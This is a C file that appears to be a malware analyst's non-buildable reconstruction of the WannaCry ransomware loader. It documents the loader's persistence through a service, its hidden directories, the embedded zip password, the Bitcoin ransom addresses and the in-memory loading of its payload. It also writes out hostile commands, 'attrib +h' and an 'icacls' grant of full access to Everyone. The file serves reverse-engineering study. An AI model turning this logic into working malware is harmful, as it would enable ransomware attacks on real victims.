/*
 * WannaCry core loader: analysis-oriented C reconstruction
 * =========================================================
 *
 * Sample SHA-256:
 *   ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa
 *
 * This file is a readable reconstruction of behavior observed in the Ghidra
 * decompilation. It is deliberately NOT buildable and omits third-party library
 * internals. It must not be treated as original source code.
 *
 * Address suffixes in comments refer to the original image base 0x00400000.
 */

#include <stdint.h>
#include <stddef.h>

#define ANALYSIS_ONLY 1
#define CONFIG_SIZE                 0x30CU
#define T_WNRY_RSA_BLOB_SIZE        0x100U
#define MAX_T_WNRY_FILE_SIZE        0x06400000U
#define WORK_BUFFER_SIZE            0x00100000U
#define CONFIG_WALLET_OFFSET        0x00B2U
#define ZIP_RESOURCE_ID             2058
#define ZIP_RESOURCE_LANGUAGE       1033
#define ZIP_RESOURCE_FILE_OFFSET    0x000100F0U
#define ZIP_RESOURCE_SIZE           0x00349635U
#define INSTALL_MUTEX_WAIT_SECONDS  60U

static const char kConfigFilename[] = "c.wnry";
static const char kInstalledExecutableName[] = "tasksche.exe";
static const char kEncryptedPayloadFilename[] = "t.wnry";
static const char kPayloadExportName[] = "TaskStart";
static const char kEmbeddedZipPassword[] = "WNcry@2ol7";
static const char kTwnryMagic[8] = { 'W','A','N','A','C','R','Y','!' };
static const char kMutexName[] = "Global\\MsWinZonesCacheCounterMutexA0";
static const wchar_t kRegistrySubkey[] = L"Software\\WanaCrypt0r";
static const char kRegistryValue[] = "wd";

static const char *const kBitcoinAddresses[3] = {
    "115p7UMMngoj1pMvkpHijcRdfJNXj6LrLn",
    "12t9YDPgwueZ9NyMgw519p7AA8isjr6SMw",
    "13AM4VW2dhxYgXeQepoHkHSQuy6NgaEb94"
};

/* Opaque analysis types. */
typedef void *HANDLE_A;
typedef void *MODULE_A;
typedef void *MAPPED_MODULE_A;
typedef struct PayloadCryptoContext PayloadCryptoContext;

/* -------------------------------------------------------------------------
 * 0x00401225 -- host-derived service/directory name
 * ------------------------------------------------------------------------- */
static void GenerateHostDerivedName(char *output)
{
    wchar_t computer_name[400] = {0};
    uint32_t seed = 1;
    size_t length;
    int letter_count;
    int i;

    /* GetComputerNameW(computer_name, ...); */
    length = pseudo_wcslen(computer_name);

    for (size_t n = 0; n < length; ++n)
        seed *= (uint16_t)computer_name[n];

    pseudo_srand(seed);                 /* MSVCRT srand/rand, not a CSPRNG. */
    int first_random = pseudo_rand();
    letter_count = (first_random % 8) + 8;   /* 8..15 letters */

    for (i = 0; i < letter_count; ++i)
        output[i] = (char)('a' + (pseudo_rand() % 26));

    for (; i < letter_count + 3; ++i)
        output[i] = (char)('0' + (pseudo_rand() % 10));

    output[i] = '\0';                  /* Total length: 11..18 characters. */
}

/* -------------------------------------------------------------------------
 * 0x00401AF6 / 0x00401B5F -- working-directory selection
 * ------------------------------------------------------------------------- */
static int TryCreateWorkingDirectory(
    const wchar_t *base_directory,
    const wchar_t *generated_name,
    wchar_t *optional_full_path)
{
    pseudo_CreateDirectoryW(base_directory);
    if (!pseudo_SetCurrentDirectoryW(base_directory))
        return 0;

    pseudo_CreateDirectoryW(generated_name);
    if (!pseudo_SetCurrentDirectoryW(generated_name))
        return 0;

    /* Exact decompilation performs Get/SetFileAttributesW(generated_name)
       after changing into that directory. Relative-path semantics are odd;
       the later `attrib +h .` command definitely hides the active directory. */
    pseudo_AttemptHiddenSystemAttributes(generated_name);

    if (optional_full_path != NULL)
        pseudo_swprintf(optional_full_path, L"%s\\%s", base_directory, generated_name);

    return 1;
}

static int SelectInstallationDirectory(wchar_t *optional_full_path)
{
    wchar_t windows_directory[260] = {0};
    wchar_t candidate[260] = {0};
    wchar_t generated_name[100] = {0};

    pseudo_MultiByteToWideChar(gHostDerivedName, generated_name, 100);
    pseudo_GetWindowsDirectoryW(windows_directory, 260);

    /* First candidate is only attempted when it already exists. */
    pseudo_swprintf(candidate, L"%s\\ProgramData", windows_directory);
    if (pseudo_GetFileAttributesW(candidate) != INVALID_ATTRIBUTES &&
        TryCreateWorkingDirectory(candidate, generated_name, optional_full_path))
        return 1;

    pseudo_swprintf(candidate, L"%s\\Intel", windows_directory);
    if (TryCreateWorkingDirectory(candidate, generated_name, optional_full_path))
        return 1;

    /* One additional fallback call lost its arguments in Ghidra's stack
       recovery. Keep it unresolved rather than inventing a path. */
    if (TryAdditionalUnresolvedDirectoryFallback(generated_name, optional_full_path))
        return 1;

    pseudo_GetTempPathW(candidate, 260);
    RemoveTrailingBackslash(candidate);
    return TryCreateWorkingDirectory(candidate, generated_name, optional_full_path);
}

/* -------------------------------------------------------------------------
 * 0x004010FD -- registry-backed working directory
 * ------------------------------------------------------------------------- */
static int RegistryWorkingDirectory(int save_current_directory)
{
    /* Tries HKLM first, then HKCU:
         Software\\WanaCrypt0r
       Value:
         wd   (REG_SZ)
    */
    for (int hive = 0; hive < 2; ++hive) {
        HANDLE_A key = pseudo_RegCreateKeyW(hive == 0 ? HKLM_A : HKCU_A,
                                            kRegistrySubkey);
        if (key == NULL)
            continue;

        int ok;
        if (save_current_directory) {
            char cwd[519] = {0};
            pseudo_GetCurrentDirectoryA(sizeof(cwd), cwd);
            ok = pseudo_RegSetStringA(key, kRegistryValue, cwd);
        } else {
            char saved[519] = {0};
            ok = pseudo_RegQueryStringA(key, kRegistryValue, saved, sizeof(saved));
            if (ok)
                pseudo_SetCurrentDirectoryA(saved);
        }
        pseudo_RegCloseKey(key);
        if (ok)
            return 1;
    }
    return 0;
}

/* -------------------------------------------------------------------------
 * 0x00401064 -- hidden process wrapper
 * ------------------------------------------------------------------------- */
static int RunHiddenProcess(char *mutable_command_line,
                            uint32_t timeout_ms,
                            uint32_t *optional_exit_code)
{
    HANDLE_A process = NULL;
    HANDLE_A thread = NULL;

    if (!pseudo_CreateProcessHiddenNoWindow(mutable_command_line, &process, &thread))
        return 0;

    if (timeout_ms != 0) {
        if (pseudo_WaitForSingleObject(process, timeout_ms) != WAIT_OBJECT_0_A)
            pseudo_TerminateProcess(process, UINT32_MAX);
        if (optional_exit_code != NULL)
            *optional_exit_code = pseudo_GetExitCodeProcess(process);
    }

    pseudo_CloseHandle(process);
    pseudo_CloseHandle(thread);
    return 1;
}

/* -------------------------------------------------------------------------
 * 0x00401CE8 / 0x00401EFF / 0x00401F5D -- persistence and handoff
 * ------------------------------------------------------------------------- */
static int InstallAndStartService(const char *full_tasksche_path)
{
    char service_command[1024];
    pseudo_sprintf(service_command, "cmd.exe /c \"%s\"", full_tasksche_path);

    HANDLE_A scm = pseudo_OpenSCManagerAllAccess();
    if (scm == NULL)
        return 0;

    HANDLE_A service = pseudo_OpenServiceAllAccess(scm, gHostDerivedName);
    if (service == NULL) {
        service = pseudo_CreateAutoStartOwnProcessService(
            scm,
            gHostDerivedName,             /* service name */
            gHostDerivedName,             /* display name */
            service_command,
            SERVICE_ERROR_NORMAL_A);
    }

    int ok = 0;
    if (service != NULL) {
        pseudo_StartService(service);
        pseudo_CloseServiceHandle(service);
        ok = 1;
    }
    pseudo_CloseServiceHandle(scm);
    return ok;
}

static int WaitForInitializationMutex(unsigned seconds)
{
    for (unsigned i = 0; i < seconds; ++i) {
        HANDLE_A mutex = pseudo_OpenMutexSynchronize(kMutexName);
        if (mutex != NULL) {
            pseudo_CloseHandle(mutex);
            return 1;
        }
        pseudo_Sleep(1000);
    }
    return 0;
}

static int StartInstalledCopy(void)
{
    char full_path[520] = {0};
    pseudo_GetFullPathNameA(kInstalledExecutableName, full_path, sizeof(full_path));

    if (InstallAndStartService(full_path) &&
        WaitForInitializationMutex(INSTALL_MUTEX_WAIT_SECONDS))
        return 1;

    if (RunHiddenProcess(full_path, 0, NULL) &&
        WaitForInitializationMutex(INSTALL_MUTEX_WAIT_SECONDS))
        return 1;

    return 0;
}

/* -------------------------------------------------------------------------
 * 0x00401DAB -- resource archive extraction
 * ------------------------------------------------------------------------- */
static int ExtractEmbeddedResourceArchive(MODULE_A image, const char *password)
{
    /* PE resource:
         type     = "XIA"
         name/id  = 2058 (0x80A)
         language = 1033 (en-US)
         raw file offset = 0x100F0
         size = 3,446,325 bytes
    */
    const void *resource_bytes = NULL;
    uint32_t resource_size = 0;
    if (!pseudo_LoadResourceBytes(image, "XIA", ZIP_RESOURCE_ID,
                                  &resource_bytes, &resource_size))
        return 0;

    HANDLE_A archive = pseudo_OpenPasswordProtectedZipFromMemory(
        resource_bytes, resource_size, password);
    if (archive == NULL)
        return 0;

    int count = pseudo_GetZipEntryCount(archive);
    for (int index = 0; index < count; ++index) {
        char entry_name[296] = {0};
        pseudo_GetZipEntryName(archive, index, entry_name, sizeof(entry_name));

        /* Keep an existing configuration across repeated launches. */
        if (pseudo_strcmp(entry_name, kConfigFilename) != 0 ||
            pseudo_GetFileAttributesA(entry_name) == INVALID_ATTRIBUTES) {
            pseudo_ExtractZipEntryToDisk(archive, index, entry_name);
        }
    }

    pseudo_CloseZipArchive(archive);
    return 1;
}

/* -------------------------------------------------------------------------
 * 0x00401E9E -- c.wnry patching
 * ------------------------------------------------------------------------- */
static void PatchConfigWithBitcoinAddress(void)
{
    uint8_t config[CONFIG_SIZE];
    if (!pseudo_ReadExactly(kConfigFilename, config, sizeof(config)))
        return;

    const char *wallet = kBitcoinAddresses[pseudo_rand() % 3];
    pseudo_strcpy((char *)&config[CONFIG_WALLET_OFFSET], wallet);
    pseudo_WriteExactly(kConfigFilename, config, sizeof(config));
}

/* -------------------------------------------------------------------------
 * 0x004014A6 -- t.wnry container
 * ------------------------------------------------------------------------- */
typedef struct TwnryHeaderObserved {
    char     magic[8];             /* "WANACRY!" */
    uint32_t rsa_blob_size;        /* must equal 0x100 */
    uint8_t  rsa_encrypted_key[256];
    uint32_t reserved_or_mode;     /* read but not consumed in this loader */
    uint64_t plaintext_size;       /* high dword must be zero; bounded */
    uint8_t  ciphertext[];         /* remaining file bytes */
} TwnryHeaderObserved;

static void *DecryptTwnryPayload(PayloadCryptoContext *ctx,
                                 const char *filename,
                                 uint32_t *plaintext_size_out)
{
    HANDLE_A file = pseudo_OpenReadOnlyShared(filename);
    if (file == INVALID_HANDLE_A)
        return NULL;

    uint64_t file_size = pseudo_GetFileSize64(file);
    if (file_size > MAX_T_WNRY_FILE_SIZE)
        return NULL;

    TwnryHeaderObserved fixed;
    if (!pseudo_Read(file, &fixed.magic, 8) ||
        pseudo_memcmp(fixed.magic, kTwnryMagic, 8) != 0)
        return NULL;

    if (!pseudo_Read(file, &fixed.rsa_blob_size, 4) ||
        fixed.rsa_blob_size != T_WNRY_RSA_BLOB_SIZE)
        return NULL;

    if (!pseudo_Read(file, fixed.rsa_encrypted_key, T_WNRY_RSA_BLOB_SIZE))
        return NULL;

    if (!pseudo_Read(file, &fixed.reserved_or_mode, 4) ||
        !pseudo_Read(file, &fixed.plaintext_size, 8))
        return NULL;

    if ((fixed.plaintext_size >> 32) != 0 ||
        (uint32_t)fixed.plaintext_size > MAX_T_WNRY_FILE_SIZE)
        return NULL;

    uint8_t recovered_key[512];
    uint32_t recovered_key_size = 0;
    if (!pseudo_RsaPrivateDecrypt(ctx,
                                  fixed.rsa_encrypted_key,
                                  T_WNRY_RSA_BLOB_SIZE,
                                  recovered_key,
                                  &recovered_key_size))
        return NULL;

    /* RijndaelInitialize(recovered_key, static IV, recovered_key_size, 16). */
    pseudo_RijndaelInitialize(ctx, recovered_key, kTwnryInitializationVector,
                              recovered_key_size, 16);

    uint8_t *ciphertext = pseudo_ContextCiphertextBuffer(ctx); /* 1 MiB */
    uint8_t *plaintext  = pseudo_GlobalAlloc((uint32_t)fixed.plaintext_size);
    uint32_t bytes_read = pseudo_ReadRemaining(file, ciphertext, WORK_BUFFER_SIZE);

    if (plaintext == NULL || bytes_read < (uint32_t)fixed.plaintext_size)
        return NULL;

    pseudo_RijndaelCbcDecrypt(ctx, ciphertext, plaintext, bytes_read);
    *plaintext_size_out = (uint32_t)fixed.plaintext_size;
    return plaintext;
}

/* -------------------------------------------------------------------------
 * 0x00401FE7 -- real loader entry point
 * ------------------------------------------------------------------------- */
int WannaCryLoaderMain(void)
{
    char module_path[520] = {0};
    pseudo_GetModuleFileNameA(module_path, sizeof(module_path));
    GenerateHostDerivedName(gHostDerivedName);

    /* The short install switch is very likely "/i", but the exported Ghidra
       C represents it only as DAT_0040F538. Confirm the bytes before claiming
       exact spelling in a publication. */
    if (pseudo_argc() == 2 &&
        pseudo_strcmp(pseudo_argv(1), kInstallSwitch_ProbableSlashI) == 0 &&
        SelectInstallationDirectory(NULL)) {

        pseudo_CopyFileA(module_path, kInstalledExecutableName, 0 /* overwrite */);
        if (pseudo_GetFileAttributesA(kInstalledExecutableName) != INVALID_ATTRIBUTES &&
            StartInstalledCopy())
            return 0;
    }

    RemoveFilenameFromAnsiPath(module_path);
    pseudo_SetCurrentDirectoryA(module_path);

    RegistryWorkingDirectory(1);   /* save CWD, HKLM then HKCU */
    ExtractEmbeddedResourceArchive(NULL, kEmbeddedZipPassword);
    PatchConfigWithBitcoinAddress();

    RunHiddenProcess("attrib +h .", 0, NULL);
    RunHiddenProcess("icacls . /grant Everyone:F /T /C /Q", 0, NULL);

    if (pseudo_ResolveCryptoAndFileApis()) {
        PayloadCryptoContext *ctx = pseudo_NewPayloadCryptoContext();
        if (ctx != NULL && pseudo_InitializePayloadCryptoContext(ctx)) {
            uint32_t plaintext_size = 0;
            void *plain_pe = DecryptTwnryPayload(
                ctx, kEncryptedPayloadFilename, &plaintext_size);

            if (plain_pe != NULL) {
                MAPPED_MODULE_A mapped = pseudo_MemoryLoadLibrary(
                    plain_pe, plaintext_size);
                if (mapped != NULL) {
                    void (*TaskStart)(void *, void *) =
                        pseudo_MemoryGetProcAddress(mapped, kPayloadExportName);
                    if (TaskStart != NULL)
                        TaskStart(NULL, NULL);
                }
            }
        }
        pseudo_DeletePayloadCryptoContext(ctx);
    }

    return 0;
}
